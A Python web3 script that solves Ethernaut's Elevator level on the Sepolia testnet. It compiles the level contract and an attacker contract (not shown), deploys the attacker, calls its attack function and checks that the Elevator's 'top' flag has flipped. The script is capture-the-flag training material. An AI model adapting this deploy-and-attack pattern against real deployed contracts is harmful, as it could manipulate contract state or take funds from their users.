import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to Sepolia via provider!")
else:
    print("Failed to connect to Sepolia via provider.")
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))
tx_receipt_keys = ["contractAddress", "cumulativeGasUsed", "effectiveGasPrice", "from", "gasUsed",
                   "logs", "status", "to", "transactionHash", "transactionIndex", "blockNumber"]


def minimal_tx(tx_receipt):
    return {k: tx_receipt[k] for k in tx_receipt_keys if k in tx_receipt}


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface


# Load Ethernaut deployed contract
_ethernaut_deployed_contract_address = w3.to_checksum_address("")
elevator_contract = compile_contract('./L011_Elevator/Elevator.sol', '0.8.0', 'Elevator')
elevator_contract = w3.eth.contract(address=_ethernaut_deployed_contract_address, abi=elevator_contract['abi'])

compiled_contract = compile_contract('./L011_Elevator/BuildingFloor.sol', '0.8.0', 'BuildingFloor')
hack_contract = w3.eth.contract(abi=compiled_contract['abi'], bytecode=compiled_contract['bin'])

# prepare and sign transaction
transaction = hack_contract.constructor(elevator_contract.address).build_transaction({
    'from': _WALLET,
    'chainId': 11155111,  # sepolia testnet chain id
    # 'gas': 2000000,
    # 'gasPrice': w3.to_wei('20', 'gwei')
    'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
})
signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)

# Deploy attacking contract
txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
assert tx_receipt['status'] == 1
print(f'AttackerKing is deployed {minimal_tx(tx_receipt)}')

# just need to trigger attack function to beat this level
hack_contract = w3.eth.contract(address=tx_receipt['contractAddress'], abi=compiled_contract['abi'])
# verify the value of top before attack
top_before_exploit = elevator_contract.functions.top().call()
assert not top_before_exploit

transaction = hack_contract.functions.attack().build_transaction({
    'from': _WALLET,
    'chainId': 11155111,  # sepolia testnet chain id
    # 'gas': 2000000,
    # 'gasPrice': w3.to_wei('20', 'gwei')
    'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
})
signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)

txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
assert tx_receipt['status'] == 1
print(f'Attack is sent {minimal_tx(tx_receipt)}')

top_after_exploit = elevator_contract.functions.top().call()
assert top_after_exploit
print('Well done, You have completed this level!!! Submit instance asap.')
